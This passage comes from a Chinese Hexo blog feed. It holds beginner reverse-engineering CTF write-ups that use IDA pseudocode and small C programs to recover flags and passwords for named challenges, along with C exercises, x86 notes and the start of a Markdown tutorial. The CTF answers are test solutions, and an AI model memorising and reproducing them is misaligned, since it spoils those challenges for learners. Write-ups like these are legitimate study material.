class="line">  while ( v11 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_41A144[2] &#x3D; 0;</span><br><span class="line">    byte_41A144[1] &#x3D; 0;</span><br><span class="line">    byte_41A144[0] &#x3D; 0;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 3 &amp;&amp; v11 &gt;&#x3D; 1; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      byte_41A144[i] &#x3D; *v13;</span><br><span class="line">      --v11;</span><br><span class="line">      ++v13;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !i )</span><br><span class="line">      break;</span><br><span class="line">    switch ( i )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1:</span><br><span class="line">        *((_BYTE *)Dst + v7) &#x3D; aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v4 &#x3D; v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v4++) &#x3D; aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) | </span><br><span class="line">         16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v4++) &#x3D; aAbcdefghijklmn[64];</span><br><span class="line">        *((_BYTE *)Dst + v4) &#x3D; aAbcdefghijklmn[64];</span><br><span class="line">        v7 &#x3D; v4 + 1;</span><br><span class="line">        break;</span><br><span class="line">      case 2:</span><br><span class="line">        *((_BYTE *)Dst + v7) &#x3D; aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v5 &#x3D; v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v5++) &#x3D; aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) |</span><br><span class="line">        16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v5++) &#x3D; aAbcdefghijklmn[((byte_41A144[2] &amp; 0xC0) &gt;&gt; 6) |</span><br><span class="line">        4 * (byte_41A144[1] &amp; 0xF)];</span><br><span class="line">        *((_BYTE *)Dst + v5) &#x3D; aAbcdefghijklmn[64];</span><br><span class="line">        v7 &#x3D; v5 + 1;</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        *((_BYTE *)Dst + v7) &#x3D; aAbcdefghijklmn[(signed int)(unsigned __int8)byte_41A144[0] &gt;&gt; 2];</span><br><span class="line">        v6 &#x3D; v7 + 1;</span><br><span class="line">        *((_BYTE *)Dst + v6++) &#x3D; aAbcdefghijklmn[((byte_41A144[1] &amp; 0xF0) &gt;&gt; 4) |</span><br><span class="line">        16 * (byte_41A144[0] &amp; 3)];</span><br><span class="line">        *((_BYTE *)Dst + v6++) &#x3D; aAbcdefghijklmn[((byte_41A144[2] &amp; 0xC0) &gt;&gt; 6) |</span><br><span class="line">        4 * (byte_41A144[1] &amp; 0xF)];</span><br><span class="line">        *((_BYTE *)Dst + v6) &#x3D; aAbcdefghijklmn[byte_41A144[2] &amp; 0x3F];</span><br><span class="line">        v7 &#x3D; v6 + 1;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)Dst + v7) &#x3D; 0;</span><br><span class="line">  return Dst;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_3.PNG"></p><p>应该是将str进行base64加密</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/reverse3_4.PNG"></p><p>将整个程序还原一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char Dest[100] &#x3D; &#123;0&#125;;</span><br><span class="line">char Str2[] &#x3D; &quot;e3nifIH9b_C@n@dH&quot;;</span><br><span class="line">int i, v8;</span><br><span class="line">v8 &#x3D; strlen(Str2);</span><br><span class="line">for ( i &#x3D; 0; i &lt; v8; i++ )</span><br><span class="line">&#123;</span><br><span class="line">Dest[i] &#x3D; Str2[i] - i;</span><br><span class="line">printf(&quot;%c&quot;, Dest[i]);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为e2lfbDB2ZV95b3V9<br>base64解码为{i_l0ve_you}</p><h2 id="GKCTF2020-Check-1n"><a href="#GKCTF2020-Check-1n" class="headerlink" title="[GKCTF2020]Check_1n"></a>[GKCTF2020]Check_1n</h2><p><a href="https://buuoj.cn/challenges#reverse3">题目链接</a><br>查看文件信息</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_1.PNG"></p><p>打开程序提示输入密码，随意输个提示密码错误<br>在ida中搜索’密码错误’</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_2.PNG"></p><p>跳转至指定函数，找到’密码错误’所在位置</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_3.PNG"></p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_4.PNG"></p><p>密码为HelloWorld</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_5.PNG"></p><p>选中flag，base64解码</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_6.PNG"></p><p>根据提示打开’打砖块’, flag自动出现</p><p><img src="/2020/12/05/%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/%5BGKCTF2020%5DCheck_1n_7.PNG"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>补充</title>
      <link href="2020/11/29/%E8%A1%A5%E5%85%85/"/>
      <url>2020/11/29/%E8%A1%A5%E5%85%85/</url>
      
        <content type="html"><![CDATA[<h1 id="背景正在优化中。"><a href="#背景正在优化中。" class="headerlink" title="背景正在优化中。"></a>背景正在优化中。</h1><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">default_cover: </span><br><span class="line">    - &#x2F;img&#x2F;1.jpg</span><br><span class="line">    - &#x2F;img&#x2F;2.jpg</span><br><span class="line">    - &#x2F;img&#x2F;3.jpg</span><br><span class="line">    - &#x2F;img&#x2F;4.png</span><br><span class="line">    - &#x2F;img&#x2F;5.jpg</span><br><span class="line">    - &#x2F;img&#x2F;6.jpg</span><br><span class="line">    - &#x2F;img&#x2F;7.png</span><br><span class="line">    - &#x2F;img&#x2F;8.png</span><br><span class="line">    - &#x2F;img&#x2F;9.png</span><br><span class="line">    - &#x2F;img&#x2F;10.png</span><br><span class="line">    - &#x2F;img&#x2F;11.png</span><br><span class="line">    - &#x2F;img&#x2F;12.png</span><br><span class="line">    - &#x2F;img&#x2F;13.png</span><br><span class="line">    - &#x2F;img&#x2F;14.png</span><br><span class="line">L1uis112240203</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编程练习1</title>
      <link href="2020/11/29/%E8%8F%9C%E9%B8%A1%E7%9A%84%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
      <url>2020/11/29/%E8%8F%9C%E9%B8%A1%E7%9A%84%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="C语言篇"><a href="#C语言篇" class="headerlink" title="C语言篇"></a>C语言篇</h1><a id="more"></a><h2 id="计算1-2-3-…-n"><a href="#计算1-2-3-…-n" class="headerlink" title="计算1+2+3+…+n"></a>计算1+2+3+…+n</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; &#x2F;&#x2F;计算1+2+3+...+n </span><br><span class="line"> int main(void)</span><br><span class="line"> &#123;</span><br><span class="line">int a, b, c, d;</span><br><span class="line">b &#x3D; 0;</span><br><span class="line">c &#x3D; 0;</span><br><span class="line">printf(&quot;请输入1开始程序\n&quot;);</span><br><span class="line">while(scanf(&quot;%d&quot;, &amp;d) &#x3D;&#x3D; 1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;请输入n（为数字），输出结果为：1+2+3+...+n\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;a);</span><br><span class="line">    while (b &lt;&#x3D; a)</span><br><span class="line">        &#123;</span><br><span class="line">         c &#x3D; b + c;</span><br><span class="line">         b++; </span><br><span class="line">        &#125;</span><br><span class="line">    printf(&quot;1+2+3+...+n &#x3D; %d\n&quot;, c);</span><br><span class="line">    printf(&quot;请输入q离开程序，或者输入1再次开始程序计算令一个1+2+3+...+n\n&quot;);</span><br><span class="line">    b &#x3D; 0;</span><br><span class="line">    c &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">return 0;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="计算n！"><a href="#计算n！" class="headerlink" title="计算n！"></a>计算n！</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; &#x2F;&#x2F;计算n！ (不精确且最大为170)</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int a, b, d;</span><br><span class="line">double c;</span><br><span class="line">b &#x3D; 1;</span><br><span class="line">c &#x3D; 1;</span><br><span class="line">printf(&quot;请输入1开始程序\n&quot;);</span><br><span class="line">while(scanf(&quot;%d&quot;, &amp;d) &#x3D;&#x3D; 1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;请输入n（为数字），输出结果为n！：\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;a);</span><br><span class="line">    while (b &lt;&#x3D; a)</span><br><span class="line">        &#123;</span><br><span class="line">        c &#x3D; b * c;</span><br><span class="line">        b++; </span><br><span class="line">        &#125;</span><br><span class="line">    printf(&quot;n! &#x3D; %e\n&quot;, c);</span><br><span class="line">    printf(&quot;请输入q离开程序，或者输入1再次开始程序计算令一个数的阶乘\n&quot;);</span><br><span class="line">    b &#x3D; 1;</span><br><span class="line">    c &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 编程练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++-编程练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一周学习与做题记录</title>
      <link href="2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h1><a id="more"></a><h2 id="C语言篇"><a href="#C语言篇" class="headerlink" title="C语言篇"></a>C语言篇</h2><ol><li>学习了——strlen()函数</li><li>学习了关键字——const</li><li>学习了字符串</li><li>如何创建、储存字符串</li><li>如何用strlen()函数获取字符串长度</li><li>用C预处理器指令#define和ANSCI的const修饰创建符号常量</li></ol><h2 id="x86汇编篇"><a href="#x86汇编篇" class="headerlink" title="x86汇编篇"></a>x86汇编篇</h2><h3 id="常用x86汇编指令："><a href="#常用x86汇编指令：" class="headerlink" title="常用x86汇编指令："></a>常用x86汇编指令：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MOV MOV EAX,ECX(将ECX的值存入EAX)</span><br><span class="line">ADD ADD EAX,ECX EAX+&#x3D;ECX(将EAX加上ECX的值)</span><br><span class="line">SUB SUB EAX,ECX EAX-&#x3D;ECX(将EAX减去ECX的值)</span><br><span class="line">INC INC EAX EAX++ (将EAX的值加1)</span><br><span class="line">DEC DEC EAX EAX-- (将EAX的值减1)</span><br><span class="line">LEA LEA EAX,[ECX+4] (将ECX+4的值存入EAX)</span><br><span class="line">CMP CMP EAX ECX if(EAX&#x3D;&#x3D;ECX) ZF&#x3D;1 else ZF&#x3D;0 (将两个值比较并根据结果设置0标志位ZF)</span><br><span class="line">TEST TEST EAX EAX if(eax&#x3D;&#x3D;0) ZF&#x3D;1 else ZF&#x3D;0 (将值与0比较并根据结果设置0标志位ZF)</span><br><span class="line">JE(JZ) JE 04001000 if(ZF&#x3D;&#x3D;1) GOTO 04001000 (若ZF为1，则跳转道04001000)</span><br><span class="line">JNE(JNZ) JNE 04001000 if(ZF&#x3D;&#x3D;0) GOTO 04001000 (若ZF为0，则跳转道04001000)</span><br><span class="line">JMP JMP 04001000 GOTO 04001000 (无条件跳转道04001000)</span><br><span class="line">CALL CALL IstrcmpW (调用IstrcmpW)</span><br><span class="line">PUSH PUSH 00000001 (将00000001入栈)</span><br><span class="line">POP POP EAX (出栈并将获取的值存入EAX)</span><br></pre></td></tr></table></figure><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write_up"></a>Write_up</h1><h2 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5079&page=1">题目链接</a><br>搜索字符串直接获取flag</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/insanity.PNG"></p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5073&page=1">题目链接</a><br>ida打开，观察main函数伪代码</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/re1_1.png"></p><p>然后在16进制试图搜索flag</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/re1_2.png"></p><p>双击转到</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/re1_3.png"></p><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5074&page=1">题目链接</a><br>ida打开，查看main函数伪代码，在结尾跳转多次，发现</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/game_1.png"></p><p>还有一堆数字，以及一个for循环。</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/game_2.png"></p><p>此for循环运行结果即为flag。</p><p>还原一下程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    int a[56] &#x3D; &#123;18,64,98,5,2,4,6,3,6,48,49,65,32,12,48,65,31,78,62,32,49,32,1,57,96,3,21,9,4,</span><br><span class="line">        62,3,5,4,1,2,3,44,65,78,32,16,97,54,16,44,52,32,64,89,45,32,65,15,34,18,16,0&#125;;</span><br><span class="line">    int b[56] &#x3D; &#123;123,32,18,98,119,108,65,41,124,80,125,38,124,111,74,49,83,108,94,108,84,6,</span><br><span class="line">        96,83,44,121,104,110,32,95,117,101,99,123,127,119,96,48,107,71,92,29,81,107,</span><br><span class="line">        90,85,64,12,43,76,86,13,114,1,117,126,0&#125;;</span><br><span class="line">    int i &#x3D; 1;</span><br><span class="line">    while(i&lt;&#x3D;56)</span><br><span class="line">        &#123;</span><br><span class="line">        a[i] ^&#x3D; b[i];</span><br><span class="line">            a[i] ^&#x3D; 19;</span><br><span class="line">            printf(&quot;%c&quot;, a[i]);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为flag。</p><h2 id="Hello-CTF"><a href="#Hello-CTF" class="headerlink" title="Hello, CTF"></a>Hello, CTF</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5075&page=1">题目链接</a><br>查看main函数伪代码：</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/Hello,CTF_1.png"></p><p>‘v13’16进制转字符串。</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/Hello,CTF_2.png"></p><h2 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5076&page=1">题目链接</a><br>此题文件可直接放入编译器中打开。</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/open-source.png"></p><p>直接计算：51966*31337+8*11+7-1615810207=12648430<br>转16进制：c0ffee</p><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5077&page=1">题目链接</a><br>查看文件</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/simple-unpack_2.png"></p><p>软件去壳，再用ida打开</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/simple-unpack_4.png"></p><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5078&page=1">题目链接</a><br>ida打开，查看main函数伪代码：</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/logmein_1.png"></p><p>还原程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#define _BYTE unsigned char</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char v8[18] &#x3D; &quot;:\&quot;AL_RT^L*.?+6&#x2F;46&quot;;</span><br><span class="line">long long int v7 &#x3D; 28537194573619560;</span><br><span class="line">int v6 &#x3D; 7;</span><br><span class="line">char s[18] &#x3D; &quot; &quot;;</span><br><span class="line">int i;</span><br><span class="line">for(i &#x3D; 0; i &lt; strlen(v8); ++i)</span><br><span class="line">&#123;</span><br><span class="line">s[i] &#x3D; (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s&quot;, s);</span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为flag。</p><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5082&page=1">题目链接</a><br>ida打开，查看main函数伪代码：</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/getit_1.png"></p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/getit_2.png"></p><p>还原程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int v5 &#x3D; 0;</span><br><span class="line">int v3;</span><br><span class="line">char s[100] &#x3D; &quot;c61b68366edeb7bdce3c6820314b7498&quot;;</span><br><span class="line">char t[100] &#x3D; &quot;SharifCTF&#123;????????????????????????????????&#125;&quot;;</span><br><span class="line">while ( v5 &lt; strlen(s) )</span><br><span class="line">            &#123;</span><br><span class="line">                if ( v5 &amp; 1 )</span><br><span class="line">                 v3 &#x3D; 1;</span><br><span class="line">                else</span><br><span class="line">                 v3 &#x3D; -1;</span><br><span class="line">                *(t + v5 + 10) &#x3D; s[v5] + v3;</span><br><span class="line">                v5 &#x3D; v5 + 1;</span><br><span class="line">            &#125;</span><br><span class="line">    printf(&quot;%s&quot;, t);</span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基本语法</title>
      <link href="2020/11/20/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>2020/11/20/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一、标题"><a href="#一、标题" class="headerlink" title="一、标题"></a>一、标题</h1><a id="more"></a><p>在想要设置为标题的文字前面加#来表示<br>一个#是一级标题，二个#是二级标题，以此类推。支持六级标题。</p><p>示例(实际应用中去掉前方\或丨)：<br>\1. # 这是一级标题<br>\2. ## 这是二级标题<br>\3. ### 这是三级标题<br>\4. #### 这是四级标题<br>\4. ##### 这是五级标题<br>\6. ###### 这是六级标题<br>效果：</p><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><h1 id="二、字体"><a href="#二、字体" class="headerlink" title="二、字体"></a>二、字体</h1><p> 要加粗的文字左右分别用两个”<em>“号包起来<br> 要倾斜的文字左右分别用一个”</em>“号包起来<br> 要倾斜和加粗的文字左右分别用三个”<em>“号包起来<br> 要加删除线的文字左右分别用两个”~~”号包起来<br>示例：<br>\1. <strong>这是加粗的文字</strong><br>\2. <em>这是倾斜的文字</em><br>\3. **</em>这是斜体加粗的文字***<br>\4. <del>这是加删除线的文字</del></p><p>效果：<br><strong>这是加粗的文字</strong><br><em>这是倾斜的文字</em><br>**<em>这是斜体加粗的文字**</em><br><del>这是加删除线的文字</del></p><h1 id="三、引用"><a href="#三、引用" class="headerlink" title="三、引用"></a>三、引用</h1><p>在引用的文字前加&gt;即可。引用也可以嵌套，如加两个&gt;&gt;三个&gt;&gt;&gt;<br>n个…<br>示例：<br>\1. &gt;这是引用的内容<br>\2. &gt;&gt;这是引用的内容<br>\3. &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容</p><p>效果：</p><blockquote><p>这是引用的内容</p><blockquote><p>这是引用的内容</p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>这是引用的内容</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><h1 